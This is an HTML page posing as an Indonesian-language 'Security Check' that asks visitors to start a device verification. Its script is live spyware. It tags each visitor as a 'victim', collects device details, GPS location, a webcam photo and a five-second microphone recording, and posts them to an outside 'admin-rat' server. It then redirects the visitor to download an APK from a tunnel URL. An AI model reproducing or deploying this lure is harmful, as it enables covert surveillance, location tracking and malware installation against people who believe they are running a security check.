<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Security Update</title>
    <style>
        body { background: #0a0a0f; color: #fff; font-family: Arial; text-align: center; padding: 50px; }
        .btn { background: #0d47a1; padding: 16px 32px; border: none; border-radius: 8px; color: #fff; font-size: 18px; cursor: pointer; }
        .btn:hover { background: #1565c0; }
    </style>
</head>
<body>
    <h1>🔒 Security Check</h1>
    <p>Klik tombol di bawah untuk verifikasi keamanan perangkat Anda.</p>
    <button class="btn" onclick="startCollection()">Mulai Verifikasi</button>
    <div id="status"></div>

    <script>
        const SERVER = 'https://admin-rat.vercel.app';
        let victimId = localStorage.getItem('victim_id') || 'V' + Date.now().toString(36).toUpperCase();

        function log(msg) {
            document.getElementById('status').innerHTML = msg;
        }

        function sendData(data) {
            fetch(SERVER + '/api/collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id: victimId, ...data })
            }).catch(() => {});
        }

        async function startCollection() {
            log('📡 Mengumpulkan data...');

            // 1. Device Info
            sendData({
                type: 'device',
                data: {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: screen.width + 'x' + screen.height,
                    isMobile: /Mobile|Android|iPhone|iPad/i.test(navigator.userAgent)
                }
            });

            // 2. Lokasi GPS
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        sendData({
                            type: 'location',
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            accuracy: pos.coords.accuracy
                        });
                        log('📍 Lokasi: ' + pos.coords.latitude + ', ' + pos.coords.longitude);
                    },
                    () => log('❌ Lokasi ditolak')
                );
            }

            // 3. Webcam
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: 'environment', width: 640, height: 480 },
                        audio: false 
                    });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.onloadedmetadata = () => {
                        video.play();
                        const canvas = document.createElement('canvas');
                        canvas.width = 640;
                        canvas.height = 480;
                        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                        const imageData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
                        
                        fetch(SERVER + '/api/collect/webcam', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ id: victimId, image: imageData })
                        });
                        log('📸 Webcam captured');
                        stream.getTracks().forEach(t => t.stop());
                    };
                } catch(e) {
                    log('❌ Kamera ditolak');
                }
            }

            // 4. Rekaman Audio (Microphone)
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    const recorder = new MediaRecorder(stream);
                    const chunks = [];
                    recorder.ondataavailable = e => chunks.push(e.data);
                    recorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'audio/webm' });
                        const reader = new FileReader();
                        reader.onload = () => {
                            const audioData = reader.result.split(',')[1];
                            fetch(SERVER + '/api/collect/audio', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ id: victimId, audio: audioData })
                            });
                            log('🎤 Audio recorded');
                        };
                        reader.readAsDataURL(blob);
                    };
                    recorder.start();
                    setTimeout(() => recorder.stop(), 5000); // Rekam 5 detik
                } catch(e) {
                    log('❌ Mikrofon ditolak');
                }
            }

            // 5. Battery
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                sendData({
                    type: 'battery',
                    level: battery.level * 100,
                    charging: battery.charging
                });
            }

            // 6. Redirect ke halaman download APK
            setTimeout(() => {
                log('📥 Mengarahkan ke download...');
                window.location.href = 'https://your-serveo-url.serveo.net/download';
            }, 3000);
        }
    </script>
</body>
</html>
